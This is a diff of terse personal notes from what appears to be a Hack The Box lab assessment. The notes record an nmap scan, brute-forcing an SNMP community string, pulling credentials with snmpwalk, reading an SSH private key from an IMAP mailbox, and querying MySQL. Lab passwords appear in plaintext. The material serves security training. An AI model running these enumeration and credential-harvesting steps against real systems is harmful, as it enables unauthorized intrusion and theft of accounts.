@@ -1330,5 +1330,14 @@ xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' /dynamic-resolutio
 The third server is an MX and management server for the internal network. Subsequently, 
 this server has the function of a backup server for the internal accounts in the domain.
  Accordingly, a user named HTB was also created here, whose credentials we need to access.
- $nmap -A <ip>10.129.37.141
- 
+ $nmap -A <ip>10.129.202.20
+ $sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 <ip>
+ <result>161 ->bruteforce to find backup 
+$onesixtyone -c /opt/useful/Seclists/Discovery/SNMP/snmp-onesixtyone.txt <ip>
+$snmpwalk -v2c -c backup <ip> <result> credential tom:NMds732Js2761
+->$openssl s_client -connect <ip>:imaps   -> select INBOX and fetch the only email in there exposing a SSH private key:
+1337 login tom pwd -> 1337 list "" *  -> 1337 select "INBOX" -> 1337 fetch 1 (body[])
+<result> get key ->save to file set permission to 600
+$chmod 600 id_rsa -> $ssh -i id_rsa tom@<ip>
+$mysql -u tom -pwd -> use users; -> SELECT * FROM users WHERE username='HTB';
+
